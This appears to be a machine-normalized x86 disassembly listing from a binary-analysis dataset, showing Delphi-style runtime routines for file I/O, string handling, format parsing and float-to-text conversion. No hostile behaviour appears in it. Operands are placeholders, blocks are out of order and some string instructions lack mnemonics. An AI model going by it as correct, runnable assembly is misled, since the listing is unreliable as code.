mov eax [ rw-data ]
xor ecx ecx
call sub_407c5c
sub_4081e4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402bc4
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408204
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404ce8
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408224
mov eax [ rw-data ]
call sub_404f18
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404f18
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050d4
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f74
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050d4
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f74
sub_4082b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407f1c
test al al
je r-xdata
sub_4082f0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4094f8
mov edx eax
test dl dl
je r-xdata
call sub_408224
push ebp
mov eax [ rw-data ]
call sub_404f20
mov edx eax
mov eax [ rw-data ]
call sub_4082b4
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404f20
mov edx eax
mov eax [ rw-data ]
call sub_4082b4
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_40838c
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f74
call sub_408224
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f74
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f74
jmp r-xdata
pop esi
pop ebx
retn
sub_4083d8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_4043e0
push eax
call CreateFileA
sub_408430
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_4043e0
push eax
call CreateFileA
pop ebx
retn
sub_40845c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408488
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4084b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4084f4
push ebx
push esi
mov esi eax
mov eax esi
call sub_4041e0
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c218
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408524
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_4041e0
mov edi eax
mov eax ebx
call sub_4043e0
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408828
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c218
cmp al 0x2
jne r-xdata
dec edi
sub_408574
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408524
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404440
pop edi
pop esi
pop ebx
retn
sub_4085ac
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_408524
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_403f20
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_404440
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4085f4
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_4043e0
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_404010
add esp 0x108
pop esi
pop ebx
retn
sub_408630
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404cc4
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404cc4
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_4086e0
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408708
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_40873c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_4041e0
push eax
mov eax ebx
call sub_4043e0
mov edx eax
mov eax esi
pop ecx
call sub_408708
pop esi
pop ebx
retn
sub_408760
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4043e0
mov edx eax
mov ecx edi
mov eax ebx
call sub_408708
pop edi
pop esi
pop ebx
retn
sub_408780
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_4087a4
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4087e4
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_40883c
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_4088b0
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4086a4
mov esi eax
inc esi
mov eax esi
call sub_408890
mov ecx esi
mov edx ebx
call sub_4086d0
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_4088ec
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c23c
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_4086d0
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407c5c
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408974
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408ccb
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408a56
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408a9e
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408a56
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408968
pop edx
or edx edx
je r-xdata
sub_408a56
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408ccb
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408a9e
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408ccb
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_4088ec
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408ac5 ]
mov ebx ecx
sub cl 0x44
je sub_408074
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404148
jmp r-xdata
mov esi sub_4041a8
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_408074
sub cl 0x44
je sub_408008
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_408008
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408074
mov ecx 0x10
cmp bl 0x58
je sub_408008
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408944
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408e84
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408008
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408cec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4086a4
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408974
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408d2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4086a4
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408974
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408d80
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_4041e0
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4041e0
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_4041e0
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408974
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_404010
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403f20
mov eax esi
mov edx ebx
call sub_40456c
mov eax [ ebp - 0x4 ]
call sub_4041e0
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408974
mov edx esi
xchg edx eax
call sub_40456c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408e40
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408e84
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_409158
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408f83
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408f8d
call sub_408f83
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408e40
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_408fe9
call sub_408f83
call sub_408f7a
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408f7a
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408e40
retn
xor ecx ecx
sub_409025
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408f7a
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408f7a
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_40908a
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_4090de
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_409025
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_409158
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_409185
jmp r-xdata
call sub_4092a7
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_409185
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402ce4
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_4092a7
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409384
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
